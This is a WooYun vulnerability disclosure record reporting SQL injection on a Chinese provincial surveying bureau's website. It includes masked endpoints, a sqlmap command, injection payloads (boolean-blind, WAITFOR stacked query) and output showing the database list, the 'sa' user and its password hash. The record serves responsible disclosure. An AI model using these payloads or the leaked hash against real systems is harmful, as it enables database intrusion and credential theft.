{"id": 80935, "wybug_id": "wooyun-2015-0154826", "wybug_title": "江西省测绘地理信息局官网存在注入漏洞打包", "wybug_corp": "江西省测绘地理信息局", "wybug_author": "路人甲", "wybug_date": "2015-11-26 15:34", "wybug_open_date": "2016-01-14 15:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数据库账户权限过高", "注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-14：\t细节向公众公开  简要描述：   1、对参数过滤不严导致注入  2、 权限过高 详细说明：  实验室简介     流域生态与地理环境监测国家测绘地理信息局重点实验室于2013年12月通过可行性论证，2014年12月经国家测绘局批准成立，由江西省测绘地理信息局、东华理工大学、江西师范大学、井冈山大学联合共建。     流域生态与地理环境监测国家测绘地理信息局重点实验室的主要建设目标是，围绕我国中长期科技发展规划对流域环境研究提出的战略需求，建立并完善数字流域资源环境监测创新研究的理论、方法与技术体系，促进流域空间信息获取、处理和共享服务的产学研用链式发展。重点实验室整合了流域生态与地理环境监测技术和应用方向上的优势研究力量，着力打造产、学、研、用“四位一体”发展平台，促进了江西省地理信息产业发展。     实验室拥有一支科研实力雄厚的学术团队，拥有固定人员45人，其中教授（正高）11人，副教授（高工）18人，国家测绘测绘地理信息局青年学术和技术带头人2名，江西省百千万人才入选者3人。固定人员中有博士学位的超过50%。整个学术团队聚集了众多的优秀人才，综合素质高，结构合理，具有科技创新、技术试验和生产实践的优势。    漏洞证明：  http://**.**.**.**/ztzl/kl/GreatEvents.aspx?t=*http://**.**.**.**/ztzl/kl/NewsDetail.aspx?id=*http://**.**.**.**/ztzl/kl/CommitteeDetail.aspx?t=1&id=*共三处注入【我只是大概看了下，并没有仔细排查，估计注入点会有更多......】\nsqlmap.py -u \"http://**.**.**.**/ztzl/kl/GreatEvents.aspx?t=1\" --dbs  --batch\n\n---Parameter: t (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: t=1 AND 4644=4644    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: t=1;WAITFOR DELAY '0:0:5'-----[17:57:59] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 R2 or 7web application technology: ASP.NET 4.0.30319, ASP.NET, Microsoft IIS 7.5back-end DBMS: Microsoft SQL Server 2008\n查看当前数据库\navailable databases [8]:[*] jxcehui[*] JXCeHuiNew[*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] tempdb\n查看当前用户及当前库：\ncurrent user:    'sa'current database:    'JXCeHuiNew'\n看看密码吧......\ndatabase management system users password hashes:[*] sa [1]:    password hash:  x01 ,f8a87fa7d7bb6d64d7fac73f15abf9c48c38e26b3ad70c76\nsa用户 ？？？ 这个... 这个... 嗯  还是不说什么了....你搞这么大权限做啥子嘛.........各种命令、各种写啊..........  在这个无图，无真相的年代，留个图 意思意思下吧\n\n我只是看看，并没有做其他动作.........   修复方案：     注入嘛  老漏洞了     过滤呗   针对数据库权限，降权ps:   发现已有入侵的痕迹，期望管理员及时排查清除   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-11-30 15:09 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给江西分中心，由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}